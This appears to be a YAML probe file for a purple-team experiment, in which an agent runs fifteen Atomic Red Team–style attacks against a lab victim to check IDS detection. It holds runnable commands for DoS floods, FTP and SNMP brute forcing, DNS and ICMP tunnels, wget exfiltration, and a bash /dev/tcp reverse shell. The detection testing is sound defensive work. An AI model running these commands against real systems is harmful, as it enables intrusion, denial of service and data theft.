# probes-art15.yaml — pinned 15-probe subset of probes.yaml for the
# ART speed-vs-accuracy experiment. Copied verbatim from probes.yaml
# (lines 1054–1423) so the agent sees identical entries; only the
# SET is narrowed.
#
# Composition: 8 expected-DETECTED + 7 expected-UNDETECTED, category-
# diverse. See conversation that created this file for rationale.
#
# Usage:
#   python purple_agent.py ... --probe-pool probes-art15.yaml --max-attacks 15
#
# Delete this file after the experiment — it is not a permanent artifact.

probes:

  # ---- 8 DETECTED (accuracy oracle — any miss = optimization broke something)

  - name: art-malicious-ua-fanout
    category: c2-modern
    mitre: T1071.001
    source: atomic-red-team
    art_test: "T1071.001 #3"
    rationale: "Classic APT-simulator User-Agent fan-out — ET MALWARE HttpBrowser etc."
    expected_sids: []
    expected_verdict: DETECTED
    already_in_catalog: false
    command: |
      curl -sS --max-time 3 -A 'HttpBrowser/1.0' "http://{{VICTIM_IP}}/" >/dev/null 2>&1 || true
      curl -sS --max-time 3 -A 'Wget/1.9+cvs-stable (Red Hat modified)' "http://{{VICTIM_IP}}/" >/dev/null 2>&1 || true
      curl -sS --max-time 3 -A 'Opera/8.81 (Windows NT 6.0; U; en)' "http://{{VICTIM_IP}}/" >/dev/null 2>&1 || true
      curl -sS --max-time 3 -A '*<|>*' "http://{{VICTIM_IP}}/" >/dev/null 2>&1 || true
      echo "4 malicious UAs sent"

  - name: art-ffuf-dvwa-dir-enum
    category: scanning
    mitre: T1595.003
    source: atomic-red-team
    art_test: "T1595 parent (ffuf community)"
    rationale: "ffuf content discovery vs DVWA — distinct UA Fuzz Faster u Fool + 404 burst"
    expected_sids: []
    expected_verdict: DETECTED
    already_in_catalog: false
    command: |
      timeout 30 ffuf -u "http://{{VICTIM_IP}}:8081/FUZZ" \
        -w /usr/share/wordlists/dirb/common.txt -t 40 -mc 200,301,302 \
        -s -noninteractive 2>&1 | tail -15 || true

  - name: art-slowhttptest-slowloris
    category: dos
    mitre: T1499.002
    source: atomic-red-team
    art_test: "T1499.002 (community — no ART atomic)"
    rationale: "Slowloris slow-headers DoS vs nginx :80 — ET POLICY Slowloris"
    expected_sids: []
    expected_verdict: DETECTED
    already_in_catalog: false
    command: |
      timeout 45 slowhttptest -c 500 -H -i 10 -r 200 -t GET \
        -u "http://{{VICTIM_IP}}/" -x 24 -p 3 -l 30 2>&1 | tail -10 || true

  - name: art-ab-http-flood-dvwa
    category: dos
    mitre: T1499.003
    source: atomic-red-team
    art_test: "T1499.003 (community — no ART atomic)"
    rationale: "ApacheBench flood vs DVWA — UA ApacheBench/x.x + high request rate"
    expected_sids: []
    expected_verdict: DETECTED
    already_in_catalog: false
    command: |
      timeout 20 ab -n 5000 -c 50 -r -q "http://{{VICTIM_IP}}:8081/login.php" 2>&1 | tail -15 || true

  - name: art-dnscat-dns-tunnel
    category: dns-tunnel
    mitre: T1071.004
    source: atomic-red-team
    art_test: "T1071.004 #3"
    rationale: "dnscat2 client handshake — long base32 subdomain queries, QTYPE diversity"
    expected_sids: []
    expected_verdict: DETECTED
    already_in_catalog: false
    command: |
      timeout 15 dnscat --dns "server={{VICTIM_IP}},port=53" \
        --secret=purple-lab-atomic purple-dnscat.example.com 2>&1 | head -15 || true

  - name: art-hydra-ftp-brute
    category: bruteforce
    mitre: T1110.001
    source: atomic-red-team
    art_test: "T1110.001"
    rationale: "FTP password brute vs vsftpd :21 — exercises new anonymous listener auth path"
    expected_sids: []
    expected_verdict: DETECTED
    already_in_catalog: false
    command: |
      printf 'admin\nroot\nftp\nanonymous\n'  > /tmp/art-ftp-users.txt
      printf 'password\n123456\nadmin\nftp\n' > /tmp/art-ftp-pass.txt
      timeout 30 hydra -L /tmp/art-ftp-users.txt -P /tmp/art-ftp-pass.txt \
        -t 4 "ftp://{{VICTIM_IP}}" 2>&1 | tail -10 || true
      rm -f /tmp/art-ftp-users.txt /tmp/art-ftp-pass.txt

  - name: art-snmp-community-brute
    category: bruteforce
    mitre: T1110.001
    source: atomic-red-team
    art_test: "T1110.001 (SNMP community — community probe)"
    rationale: "SNMP community string enumeration — ET rules on repeated SNMP GetRequest with varying communities"
    expected_sids: []
    expected_verdict: DETECTED
    already_in_catalog: false
    command: |
      for c in public private admin cisco snmp community manager monitor default; do
        timeout 2 snmpget -v1 -c "$c" "{{VICTIM_IP}}" 1.3.6.1.2.1.1.1.0 2>&1 | head -1
      done

  - name: art-remote-access-software-sni
    category: identity-abuse
    mitre: T1219
    source: atomic-red-team
    art_test: "T1219 (multi-tool SNI sweep)"
    rationale: "AnyDesk/TeamViewer/RustDesk/Atera SNI — T1219 remote access software fingerprinting"
    expected_sids: []
    expected_verdict: DETECTED
    already_in_catalog: false
    command: |
      for domain in anydesk.com teamviewer.com master7.teamviewer.com \
                    rustdesk.com agent.atera.com instance.screenconnect.com; do
        echo "--- $domain ---"
        timeout 5 openssl s_client -connect "$domain:443" -servername "$domain" \
          </dev/null 2>/dev/null | head -3
      done

  # ---- 7 UNDETECTED (category-diverse gap documentation)

  - name: art-cloudflared-tunnel
    category: tunneling
    mitre: T1572
    source: atomic-red-team
    art_test: "T1572 #7"
    rationale: "cloudflared ephemeral tunnel — TLS SNI *.trycloudflare.com"
    expected_sids: []
    expected_verdict: UNDETECTED
    already_in_catalog: false
    command: |
      timeout 10 cloudflared tunnel --url http://localhost:80 2>&1 | tail -10 || true
      echo "cloudflared tunnel attempt completed — expect SNI *.trycloudflare.com"

  - name: art-whois-tunnel
    category: c2-raw
    mitre: T1105
    source: atomic-red-team
    art_test: "T1105 #14"
    rationale: "whois-as-tunnel — raw TCP/8443 with whois protocol bytes (ART T1105 #14)"
    expected_sids: []
    expected_verdict: UNDETECTED
    already_in_catalog: false
    command: |
      timeout 5 whois -h {{VICTIM_IP}} -p 8443 "Hello from Atomic Red Team test T1105" 2>&1 | head -5 || true
      echo "whois tunnel probe sent to {{VICTIM_IP}}:8443"

  - name: art-icmpdoor-c2
    category: c2-icmp
    mitre: T1095
    source: atomic-red-team
    art_test: "T1095 #4"
    rationale: "icmpdoor full ICMP C2 tunnel — sustained bidirectional echo payloads (ART T1095 #4)"
    expected_sids: []
    expected_verdict: UNDETECTED
    already_in_catalog: false
    command: |
      timeout 8 sudo /opt/icmpdoor/icmpdoor --interface eth0 --destination_ip {{VICTIM_IP}} 2>&1 | head -10 || true
      echo "icmpdoor sent — expect sustained bidirectional ICMP to victim"

  - name: art-wget-post-https-exfil
    category: exfil
    mitre: T1048.002
    source: atomic-red-team
    art_test: "T1048.002 #3"
    rationale: "wget --post-file HTTPS exfil — distinctive Wget JA3 + TLS POST body"
    expected_sids: []
    expected_verdict: UNDETECTED
    already_in_catalog: false
    command: |
      timeout 5 wget --post-file=/etc/hostname --timeout=5 --no-check-certificate \
        "https://{{VICTIM_IP}}:8443/" -O /dev/null 2>&1 | head -10 || true
      echo "wget HTTPS exfil completed"

  - name: art-masscan-syn-burst
    category: scanning
    mitre: T1046
    source: atomic-red-team
    art_test: "T1046 (masscan)"
    rationale: "masscan fast SYN scan — 1000pps burst, timing distinct from nmap"
    expected_sids: []
    expected_verdict: UNDETECTED
    already_in_catalog: false
    command: |
      timeout 20 sudo masscan {{VICTIM_IP}} -p 22,80,443,445,3389,8080,8081,8443 \
        --rate 1000 --wait 0 2>&1 | tail -10 || true

  - name: art-bash-dev-tcp-reverse-shell
    category: c2-raw
    mitre: T1059.004
    source: atomic-red-team
    art_test: "T1059.004 (bash /dev/tcp)"
    rationale: "Pure-bash /dev/tcp reverse shell — no binary fingerprint, flow-only"
    expected_sids: []
    expected_verdict: UNDETECTED
    already_in_catalog: false
    command: |
      timeout 3 bash -c 'exec 3<>/dev/tcp/{{VICTIM_IP}}/4445; echo "/bin/sh -i" >&3; sleep 1; exec 3<&-' 2>&1 || true
      echo "bash /dev/tcp reverse shell pattern sent to :4445"

  - name: art-tor-bootstrap
    category: tunneling
    mitre: T1090.003
    source: atomic-red-team
    art_test: "T1090.003 #3"
    rationale: "Tor client bootstrap — directory-authority TLS, ET TOR reputation hits"
    expected_sids: []
    expected_verdict: UNDETECTED
    already_in_catalog: false
    command: |
      TORDIR=$(sudo mktemp -d /tmp/art-tor-XXXXXX)
      timeout 15 sudo tor --DataDirectory "$TORDIR" --SocksPort 9051 --Log 'notice stderr' 2>&1 | head -15 || true
      sudo rm -rf "$TORDIR" 2>/dev/null || true
      echo "tor bootstrap completed — expect ET TOR on DA IPs"
